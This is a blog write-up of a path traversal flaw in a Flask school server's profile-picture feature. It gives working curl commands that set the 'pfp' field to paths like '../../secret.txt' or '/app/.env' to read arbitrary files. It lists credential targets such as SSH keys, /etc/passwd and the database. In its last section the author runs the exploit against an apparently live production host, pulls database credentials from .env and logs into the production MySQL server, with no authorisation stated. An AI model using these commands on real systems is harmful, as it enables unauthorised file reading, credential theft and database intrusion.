+++
title = "Smashing Mort's Server for Fun and No Profit 1"
description = "Ported from my original blog post hosted on my Jekyll site"
date = 2025-12-09
+++

Basically, Mr. Mort's template flask server hosts an option for managing user's PFPs. I was able to find a **path traversal vulnerability** in the server which allows me to read any file I want on the host computer (including `/etc/passwd` which I used for this writeup) which effectively gives me full read access to any system this server is hosted on :D. And all you need is a regular user account.

## The Setup

The Flask server has a profile picture feature. Users can upload a profile picture, and it gets stored in their own directory under `instance/uploads/{user_id}/`. The code looks something like this:

```py,name=model/pfp.py
def pfp_base64_decode(user_id, user_pfp):
    img_path = os.path.join(app.config["UPLOAD_FOLDER"], user_id, user_pfp)
    try:
        with open(img_path, "rb") as img_file:
            base64_encoded = base64.b64encode(img_file.read()).decode("utf-8")
        return base64_encoded
    except Exception as e:
        print(f"An error occurred while reading the profile picture: {str(e)}")
        return None
```
At first glance, this seems fine. Each user has their own directory, filenames are stored in the database, and only authenticated users can access their pictures. All fine and dandy.

My suspicion at the time was that `os.path.join()` can probably be used to do things it probably shouldn't (like joining `../`):

```py
>>> import os
>>> os.path.join('/uploads', 'user123', '../../../etc/passwd')
'/uploads/user123/../../../etc/passwd'
```

That path would resolve to `/etc/passwd` and thus I'd be able to access it. Now there's two vulnerable points: `user_id` and `user_pfp`. I decided to go with the latter.


## Tracing the Attack Surface

Looking at the API endpoint that retrieves the profile pictures:

```py,name=api/pfp.py
@token_required()
def get(self):
    current_user = g.current_user

    if current_user.pfp:
        base64_encode = pfp_base64_decode(current_user.uid, current_user.pfp)
        if not base64_encode:
            return {'message': 'An error occurred while reading the profile picture.'}, 500
        return {'pfp': base64_encode}, 200
    else:
        return {'message': 'Profile picture is not set.'}, 404
```

It's immediately clear that `curent_user` comes from the database. Question is, can I control what gets stored in the database?

Unforunately, I found out that the upload endpoint uses `secure_filename()`:

```py,name=model/pfp.py
try:
    image_data = base64.b64decode(base64_image)
    filename = secure_filename(f"{user_uid}.png")
    user_dir = os.path.join(app.config["UPLOAD_FOLDER"], user_uid)
    if not os.path.exists(user_dir):
        os.makedirs(user_dir)
    file_path = os.path.join(user_dir, filename)
    with open(file_path, "wb") as img_file:
        img_file.write(image_data)
    return filename
```

Alas, the endpoint is secure after all. The filename always used `{user_uid}.png` and it's sanitized with `secure_filename()`. Dead end? Luckily no!


## Finding the Bypass

Then I found the user *update* endpoint.

```py,name=api/user.py
# Accounts are desired to be GitHub accounts, change must be validated 
if body.get('uid') and body.get('uid') != user._uid:
    _, status = GitHubUser().get(body.get('uid'))
    if status != 200:
        return {'message': f'User ID {body.get("uid")} not a valid GitHub account' }, 404

# Update the User object to the database using custom update method
user.update(body)

# return response, the updated user details as a JSON object
return jsonify(user.read())
```

This endpoint accepts any field from the request body and passes it to `user.update()`. What about the `pfp` field?

```py,name=model/user.py
@pfp.setter
def pfp(self, pfp):
    self._pfp = pfp
```

Yikes. The setter has no validation at all. I can set `pfp` to anything I want through the user update API actually.


## An Exploit

I'll first try performing this proof of concept locally. We'll first start by setting my pfp to a path traversal payload.

Let's say I put a file called `secret.txt` in my own home directory:

```bash
/home/username/secret.txt
```

Now let's set our path traversal payload to that directory:

```bash
~ curl -X PUT http://localhost:8001/api/user \
  -H "Content-Type: application/json" \
  -b cookies.txt \
  -d '{"pfp": "../../../../../../../secret.txt"}'
```

We have 7 `../` because that's how deep I store the `flask` repo locally. This is done relative from `flask/instance/uploads/toby/`.

Our response:
```json
{
  "ap_exam": {},
  "class": [],
  "email": "?",
  "grade_data": {},
  "id": 1,
  "kasm_server_needed": true,
  "name": "Thomas Edison",
  "password": "pbkdf2:sha256:1000000$5nmqG27dxK$ef0b2a220d9ada9655c29e88800f6a8c4ebbcade6ad45cb0480a233847601f5c",
  "pfp": "../../../../../../../secret.txt",
  "role": "Admin",
  "school": "Unknown",
  "sections": [
    {
      "abbreviation": "CSA",
      "id": 1,
      "name": "Computer Science A",
      "year": 2026
    },
    {
      "abbreviation": "CSP",
      "id": 2,
      "name": "Computer Science Principles",
      "year": 2026
    }
  ],
  "sid": null,
  "uid": "toby"
}
```

Notice that the `pfp` field is in fact what we set. Now we'll run a simple `GET` request to actually read it:
```bash
~ curl -X GET http://localhost:8001/api/id/pfp -b cookies.txt
```

And huzza:
```json
{
  "pfp": "cGxlYXNlIHNwZWVkIEkgbmVlZCB0aGlzIAoKZG9uJ3QgcmVhZCBtZSBwbHMKCm15IHNlcnZlciBpcyBraW5kIG9mIHZ1bG5lcmFibGUKCkkndmUgYmVlbiB3YXRjaGluZyB5b3VyIHN0cmVhbS4geW91ciBrZXkgaXM6IEJMRUhISEhICg=="
}
```

Ok, but that's in base64 because we're using it for image encoding. No problem, just decode it:
```bash
~ echo "cGxlYXNlIHNwZWVkIEkgbmVlZCB0aGlzIAoKZG9uJ3QgcmVhZCBtZSBwbHMKCm15IHNlcnZlciBpcyBraW5kIG9mIHZ1bG5lcmFibGUKCkkndmUgYmVlbiB3YXRjaGluZyB5b3VyIHN0cmVhbS4geW91ciBrZXkgaXM6IEJMRUhISEhICg==" | base64 -d
```

And get our `secret.txt` text:
```
please speed I need this

don't read me pls

my server is kind of vulnerable

I've been watching your stream. your key is: BLEHHHHH
```

It works! If you're skeptical, you can try it yourself too, just
1. Authenticate your user and store the cookie
2. `POST` to edit your pfp with some relative path (at `/api/user`)
3. `GET` your pfp (at `/api/id/pfp`)


## Escalating

There's a lot you could do with this. You could grab `/etc/passwd`, `/home/.ssh/id_ed25519` (if correct perms), etc.. I could also access source code:
```bash
~ curl -X PUT http://localhost:8001/api/user \
  -b cookies.txt \
  -d '{"pfp": "../../../__init__.py"}'
```
and database files (which contain password hashes):
```bash
~ curl -X PUT http://localhost:8001/api/user \
  -b cookies.txt \
  -d '{"pfp": "../../volumes/user_management.db"}'
```
I could also grab `.env`.


## That's Not in Prod

If you're asking, can I do this right now to Mr. Mort's deployed `flask.opencodingsociety.com`? The answer is no... but I do have some ideas. I've tried quite a few times to get this path traversal working against the actual Amazon EC2 Docker instance, but it wasn't working. For example, let's try grabbing another user's profile picture through this traversal (because if you take a look at the `docker-compose.yml`, `instance` is mounted). Usually, I get this response:
```bash
~ curl -X PUT https://flask.opencodingsociety.com/api/user \
-H "Content-Type: application/json" \
-b cookies.txt \
-d '{"pfp": "../niko/niko.png"}'
{"...", "pfp":"../niko/niko.png", "..."}
```
```bash
~ curl -X GET https://flask.opencodingsociety.com/api/id/pfp -b cookies.txt
{"message": "An error occurred while reading the profile picture."}
```

Funnily enough, the reason why this exploit doesn't work against the deployed server is simply because the profile picture feature has not been implemented (correctly). That's literally it. When you make that web request to set your profile picture, supposedly this is appended to a user's upload folder, but since the actual code doesn't create these folders, you can't navigate out of a nonexistent folder.

... Which is what I thought before I researched the function a little more.

If we take a look back at the original base64 decode function:

```py,name=model/pfp.py
def pfp_base64_decode(user_id, user_pfp):
    img_path = os.path.join(app.config['UPLOAD_FOLDER'], user_id, user_pfp)
    # ...
```
I noticed that the code happens to run a path join on wherever the uploads folder is located, your `user_id`, and the image path you give it `user_pfp`. The constant `UPLOAD_FOLDER` is defined here:

```py,name=__init__.py
app.config['UPLOAD_FOLDER'] = os.path.join(app.instance_path, 'uploads')
```

After my fiddling with the Docker container, I figured out that this would be located under `/app/instance/uploads`.

So, for example, if I wanted to upload a photo `meow.png` as my profile picture, the path would look like:

```py
>>> os.path.join('/app/instance/uploads', 'mataiodoxion', 'meow.png')
'/app/instance/uploads/mataiodoxion/meow.png'
```

However, taking a look at the docs for `os.path.join()`, we find that

> If a segment is an absolute path (which on Windows requires both a drive and a root), then all previous segments are ignored and joining continues from the absolute path segment. On Linux, for example:
> ```py
> >>> os.path.join('/home/foo', 'bar')
> '/home/foo/bar'
> >>> os.path.join('/home/foo', '/home/bar')
> '/home/bar'
> ```
> — <cite>Os.Path Python Docs[^1]</cite>

Great! So now that we know absolute paths work and we know where `.env` is stored, let's just grab it:

```sh
~ curl -X PUT https://flask.opencodingsociety.com/api/user \
-H "Content-Type: application/json" \
-b cookie.txt \
-d '{"pfp": "/app/.env"}'   
{"...", "pfp":"/app/.env", "uid":"mataiodoxion", "..."}

~ curl -X GET https://flask.opencodingsociety.com/api/id/pfp \
-H "Content-Type: application/json" \
-b cookie.txt
{"pfp": "<base64>"}

~ echo "<base64>" | base64 -d
# ...
# Database configuration
DB_ENDPOINT='...'
DB_USERNAME='admin'
DB_PASSWORD='...'
# ...
```

Now that we have that info, let's log in to the DB.

```
~ mysql -u admin -h <DB-ENDPOINT> -p --ssl-ca=global-bundle.pem
Enter password: 
Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MySQL connection id is 35579
Server version: 8.0.42 Source distribution

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MySQL [(none)]> STATUS;
--------------
mysql from 12.1.2-MariaDB, client 15.2 for Linux (x86_64) using readline 5.1

Connection id:		35579
Current database:	
Current user:		admin@<IP_ADDRESS>
SSL:			Cipher in use is TLS_AES_256_GCM_SHA384, cert is OK
Current pager:		more
Using outfile:		''
Using delimiter:	;
Server:			MySQL
Server version:		8.0.42 Source distribution
Protocol version:	10
Connection:		<DB_ENDPOINT> via TCP/IP
Server characterset:	utf8mb4
Db     characterset:	utf8mb4
Client characterset:	utf8mb4
Conn.  characterset:	utf8mb4
TCP port:		3306
Uptime:			57 days 9 hours 46 min 10 sec

Threads: 13  Questions: 6329493  Slow queries: 0  Opens: 606  Flush tables: 3  Open tables: 418  Queries per second avg: 1.276
--------------

MySQL [(none)]> SHOW DATABASES;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| mysql              |
| performance_schema |
| sys                |
| user_management    |
+--------------------+
5 rows in set (0.036 sec)

MySQL [(none)]> exit
Bye
```

[^1]: [https://docs.python.org/3/library/os.path.html#os.path.join](https://docs.python.org/3/library/os.path.html#os.path.join)
